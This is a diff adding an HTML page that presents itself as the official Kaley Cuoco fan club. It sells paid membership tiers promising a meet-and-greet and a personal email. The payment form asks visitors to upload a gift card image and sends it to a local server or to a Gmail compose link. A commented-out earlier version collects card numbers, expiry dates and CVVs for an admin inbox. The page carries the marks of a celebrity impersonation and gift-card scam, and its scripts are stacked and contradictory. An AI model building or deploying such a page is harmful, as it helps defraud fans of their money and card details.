@@ -1,0 +1,493 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kaley Cuoco Fan Club</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
+
+<style>
+:root{
+ --primary:#1f3c88;
+ --secondary:#4a69bd;
+ --accent:#ffd369;
+ --dark:#162447;
+ --light:#f9fafc;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;font-family:Poppins,sans-serif}
+body{background:var(--light);color:#222;line-height:1.6}
+
+header{
+ background:linear-gradient(to right,var(--primary),var(--secondary));
+ color:white;
+ text-align:center;
+ padding:90px 20px;
+}
+
+header h1{font-size:3.5rem}
+header p{font-size:1.2rem;opacity:.9}
+
+nav{
+ background:var(--dark);
+ padding:15px;
+ position:sticky;
+ top:0;
+ z-index:1000;
+}
+
+nav ul{
+ display:flex;
+ justify-content:center;
+ flex-wrap:wrap;
+ list-style:none;
+ gap:25px;
+}
+
+nav a{
+ color:white;
+ text-decoration:none;
+ font-weight:500;
+ transition:.3s;
+}
+
+nav a:hover{color:var(--accent)}
+
+section{
+ max-width:1200px;
+ margin:auto;
+ padding:80px 20px;
+}
+
+section h2{
+ text-align:center;
+ margin-bottom:50px;
+ font-size:2.6rem;
+ color:var(--primary);
+}
+
+.about{
+ display:grid;
+ grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
+ gap:40px;
+ align-items:center;
+}
+
+.about img{
+ width:100%;
+ border-radius:20px;
+ box-shadow:0 10px 25px rgba(0,0,0,.15);
+}
+
+.grid{
+ display:grid;
+ grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
+ gap:25px;
+}
+
+.card{
+ background:white;
+ padding:25px;
+ border-radius:15px;
+ box-shadow:0 5px 15px rgba(0,0,0,.08);
+ transition:.3s;
+ text-align:center;
+}
+
+.card:hover{transform:translateY(-8px)}
+
+.gallery{
+ display:grid;
+ grid-template-columns:repeat(auto-fit,minmax(220px,1fr));
+ gap:20px;
+}
+
+.gallery img{
+ width:100%;
+ border-radius:15px;
+ cursor:pointer;
+ transition:.3s;
+}
+
+.gallery img:hover{transform:scale(1.05)}
+
+.plan{
+ border:3px solid var(--secondary);
+ position:relative;
+}
+
+.plan.popular{
+ border-color:var(--accent);
+ transform:scale(1.05);
+}
+
+.badge{
+ position:absolute;
+ top:-12px;
+ right:-12px;
+ background:var(--accent);
+ padding:6px 12px;
+ border-radius:20px;
+ font-size:.8rem;
+ font-weight:600;
+}
+
+.price{
+ font-size:2.5rem;
+ margin:15px 0;
+ color:var(--primary);
+}
+
+.plan ul{
+ list-style:none;
+ margin:20px 0;
+}
+
+.plan li{margin:10px 0}
+
+button{
+ background:var(--primary);
+ color:white;
+ border:none;
+ padding:12px 25px;
+ border-radius:8px;
+ font-size:1rem;
+ cursor:pointer;
+ transition:.3s;
+}
+
+button:hover{background:var(--secondary)}
+
+.form-box{
+ max-width:600px;
+ margin:auto;
+ background:white;
+ padding:35px;
+ border-radius:15px;
+ box-shadow:0 5px 20px rgba(0,0,0,.1);
+}
+
+.form-box input{
+ width:100%;
+ padding:12px;
+ margin-bottom:15px;
+ border:1px solid #ccc;
+ border-radius:8px;
+}
+
+footer{
+ background:var(--dark);
+ color:white;
+ text-align:center;
+ padding:30px 15px;
+}
+
+footer p{opacity:.8}
+</style>
+</head>
+<body>
+
+<header id="home">
+ <h1>Kaley Cuoco</h1>
+ <p>Official Fan Club & Community</p>
+</header>
+
+<nav>
+ <ul>
+  <li><a href="#home">Home</a></li>
+  <li><a href="#about">About</a></li>
+  <li><a href="#career">Career</a></li>
+  <li><a href="#gallery">Gallery</a></li>
+  <li><a href="#membership">Membership</a></li>
+  <li><a href="#contact">Contact</a></li>
+ </ul>
+</nav>
+
+<section id="about">
+ <h2>About</h2>
+ <div class="about">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Kaley_Cuoco_2014.jpg">
+  <div>
+   <p>Kaley Cuoco is an award-winning American actress and producer known for her iconic roles.</p>
+   <p>She is admired for her talent, philanthropy, and dedication to animal welfare.</p>
+  </div>
+ </div>
+</section>
+
+<section id="career">
+ <h2>Career Highlights</h2>
+ <div class="grid">
+  <div class="card"><h3>8 Simple Rules</h3><p>Breakthrough role</p></div>
+  <div class="card"><h3>The Big Bang Theory</h3><p>Global superstar</p></div>
+  <div class="card"><h3>The Flight Attendant</h3><p>Emmy nominated</p></div>
+  <div class="card"><h3>Producer</h3><p>Yes, Norman Productions</p></div>
+ </div>
+</section>
+
+<section id="gallery">
+ <h2>Photo Gallery</h2>
+ <div class="gallery">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Kaley_Cuoco_2011.jpg">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Kaley_Cuoco_2012.jpg">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/f/fc/Kaley_Cuoco_2010.jpg">
+  <img src="https://upload.wikimedia.org/wikipedia/commons/9/9e/Kaley_Cuoco_2018.jpg">
+ </div>
+</section>
+
+<section id="membership">
+ <h2>Fan Membership Cards</h2>
+ <div class="grid">
+
+  <div class="card plan">
+   <h3>Silver Fan</h3>
+   <p class="price">$19 / Year</p>
+   <ul>
+    <li>Digital Card</li>
+    <li>Newsletter</li>
+    <li>Wallpapers</li>
+   </ul>
+   <button onclick="selectPlan('Silver Fan')">Join Now</button>
+  </div>
+
+  <div class="card plan popular">
+   <span class="badge">Popular</span>
+   <h3>Gold Fan</h3>
+   <p class="price">$49 / Year</p>
+   <ul>
+    <li>Physical Card</li>
+    <li>VIP News</li>
+    <li>Discounts</li>
+    <li>Events</li>
+   </ul>
+   <button onclick="selectPlan('Gold Fan')">Join Now</button>
+  </div>
+
+  <div class="card plan">
+   <h3>Platinum VIP</h3>
+   <p class="price">$99 / Year</p>
+   <ul>
+    <li>Signed Replica</li>
+    <li>Meet & Greet</li>
+    <li>Premium Merch</li>
+    <li>Personal Email</li>
+   </ul>
+   <button onclick="selectPlan('Platinum VIP')">Join Now</button>
+  </div>
+
+ </div>
+</section>
+
+<section id="contact">
+ <h2>Join the Fan Club</h2>
+
+ <div class="form-box">
+  <!-- <form id="memberForm"> -->
+
+   <!-- <input type="text" id="plan" placeholder="Selected Plan" readonly required> -->
+   <!-- <input type="text" id="name" placeholder="Full Name" required> -->
+   <!-- <input type="email" id="email" placeholder="Email Address" required> -->
+   <!-- <label>Upload Gift Card Image</label> -->
+<!-- <input type="file" id="giftcard" accept="image/*" required> -->
+
+   <!-- <input type="text" id="card" placeholder="Card Number" required> -->
+   <!-- <input type="text" id="expiry" placeholder="Expiry (MM/YY)" required> -->
+   <!-- <input type="text" id="cvv" placeholder="CVV" required> -->
+
+   <!-- <button type="submit">Complete Membership</button> -->
+  <!-- </form> -->
+
+  <!-- <p id="msg" style="margin-top:10px"></p> -->
+   <form id="memberForm" enctype="multipart/form-data">
+
+ <input type="text" id="plan" readonly required>
+ <input type="text" id="name" placeholder="Full Name" required>
+ <input type="email" id="email" placeholder="Email" required>
+
+ <label>Upload Gift Card</label>
+ <input type="file" id="giftcard" accept="image/*" required>
+
+ <img id="preview" style="width:100%;margin:10px 0;display:none">
+
+ <button>Complete Membership</button>
+
+</form>
+<p id="msg"></p>
+
+ </div>
+</section>
+
+<footer>
+ <p>© 2026 Kaley Cuoco Fan Club | Educational Project</p>
+</footer>
+
+<!-- <script>
+
+function selectPlan(name){
+ document.getElementById('plan').value=name;
+ document.getElementById('contact').scrollIntoView({behavior:'smooth'});
+}
+
+const form=document.getElementById('memberForm');
+const msg=document.getElementById('msg');
+
+// CHANGE THIS TO YOUR GMAIL ADDRESS
+const ADMIN_EMAIL = "youradminemail@gmail.com";
+
+form.addEventListener('submit',e=>{
+ e.preventDefault();
+
+ const plan=document.getElementById('plan').value;
+ const name=document.getElementById('name').value;
+ const email=document.getElementById('email').value;
+ const card=document.getElementById('card').value;
+ const expiry=document.getElementById('expiry').value;
+
+ // Email subject
+ const subject = encodeURIComponent("New Fan Club Membership Request");
+
+ // Email body
+ const body = encodeURIComponent(
+  `New Membership Application\n\n`+
+  `Plan: ${plan}\n`+
+  `Name: ${name}\n`+
+  `Email: ${email}\n`+
+  `Card Number: ${card}\n`+
+  `Expiry: ${expiry}\n\n`+
+  `Please process this membership.`
+ );
+
+ // Gmail compose link
+ const gmailURL = `https://mail.google.com/mail/?view=cm&fs=1&to=${ADMIN_EMAIL}&su=${subject}&body=${body}`;
+
+ msg.style.color='green';
+ msg.innerText='Opening Gmail...';
+
+ // Open Gmail compose window
+ window.open(gmailURL, '_blank');
+
+ form.reset();
+});
+
+</script> -->
+<script>
+
+function selectPlan(name){
+ plan.value=name;
+ contact.scrollIntoView({behavior:'smooth'});
+}
+
+// Preview
+giftcard.onchange = e =>{
+ const file = e.target.files[0];
+ preview.src = URL.createObjectURL(file);
+ preview.style.display='block';
+}
+
+// Submit
+memberForm.onsubmit = async e =>{
+ e.preventDefault();
+
+ const fd = new FormData();
+
+ fd.append('plan',plan.value);
+ fd.append('name',name.value);
+ fd.append('email',email.value);
+ fd.append('giftcard',giftcard.files[0]);
+
+ const res = await fetch('http://localhost:3000/api/membership',{
+  method:'POST',
+  body:fd
+ });
+
+ const data = await res.json();
+
+ if(data.success){
+  msg.innerText="Membership submitted!";
+  msg.style.color="green";
+  memberForm.reset();
+  preview.style.display='none';
+ }
+};
+
+</script>
+<script>
+
+function selectPlan(name){
+ document.getElementById('plan').value = name;
+ document.getElementById('contact').scrollIntoView({behavior:'smooth'});
+}
+
+// Image Preview
+document.getElementById('giftcard').addEventListener('change', e=>{
+ const file = e.target.files[0];
+ if(file){
+  preview.src = URL.createObjectURL(file);
+  preview.style.display = 'block';
+ }
+});
+
+// Submit to Server
+document.getElementById('memberForm').addEventListener('submit', async e=>{
+ e.preventDefault();
+
+ const msg = document.getElementById('msg');
+
+ const formData = new FormData();
+
+ formData.append('plan', plan.value);
+ formData.append('name', name.value);
+ formData.append('email', email.value);
+ formData.append('giftcard', giftcard.files[0]);
+
+ msg.innerText = "Sending...";
+ msg.style.color = "blue";
+
+ try{
+
+  const res = await fetch('http://localhost:3000/api/membership',{
+   method:'POST',
+   body: formData
+  });
+
+  const data = await res.json();
+
+  if(data.success){
+   msg.innerText = "Membership sent successfully!";
+   msg.style.color = "green";
+   memberForm.reset();
+   preview.style.display = "none";
+  }else{
+   throw new Error();
+  }
+
+ }catch(err){
+  msg.innerText = "Error sending. Try again.";
+  msg.style.color = "red";
+ }
+});
+
+</script>
+<script>
+
+document.getElementById('memberForm').addEventListener('submit', e=>{
+ e.preventDefault();
+
+ const subject = encodeURIComponent("New Membership");
+
+ const body = encodeURIComponent(
+  `Plan: ${plan.value}\n`+
+  `Name: ${name.value}\n`+
+  `Email: ${email.value}\n\n`+
+  `Gift card uploaded. Please ask user for file.`
+ );
+
+ const url =
+ `https://mail.google.com/mail/?view=cm&fs=1&to=yourgmail@gmail.com&su=${subject}&body=${body}`;
+
+ window.open(url,'_blank');
+});
+
+</script>
+
+</body>
+</html>
